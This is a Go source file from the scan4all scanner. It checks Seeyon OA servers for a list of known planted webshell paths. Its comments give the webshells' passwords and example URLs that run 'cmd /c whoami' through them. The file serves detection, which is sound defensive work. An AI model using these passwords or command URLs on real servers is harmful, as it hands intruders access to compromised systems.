package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
	"strings"
)

//test233.jsp pass:rebeyond
//qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+whoami
//SeeyonUpdate.jspx pass:rebeyond
//test123456.jsp?pwd=asasd3344&cmd=cmd+/c+whoami
//qwer960452.jsp?pwd=el38A9485&cmd=cmd+/c+whoami
//a234.jspx pass:rebeyond
//test10086.jsp 蚁剑密码: test
//peiqi10086.jsp 蚁剑密码: peiqi

func BackdoorScan(u string) bool {
	backurls := []string{"/seeyon/test233.jsp", "/seeyon/SeeyonUpdate.jspx", "/seeyon/SeeyonUpdate1.jspx", "/seeyon/test123456.jsp", "/seeyon/test1234567.jsp", "/seeyon/qwerasdf.jsp", "/seeyon/qwer960452.jsp", "/seeyon/ping123456.jsp", "/seeyon/common/designer/pageLayout/test233.jsp", "/seeyon/common/designer/pageLayout/test10086.jsp", "/seeyon/common/designer/pageLayout/a234.jspx", "/seeyon/common/designer/pageLayout/peiqi10086.jsp"}
	var vuln = false
	for _, backurl := range backurls {
		if req, err := pkg.HttpRequset(u+backurl, "GET", "", false, nil); err == nil {
			if req.StatusCode == 200 && (!strings.Contains(req.Body, "error") || strings.Contains(req.Body, "java.lang.NullPointerException")) && !strings.Contains(req.Body, "Burp") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon Backdoor|%s\n", u+backurl))
				vuln = true
			}
		}
	}
	return vuln
}
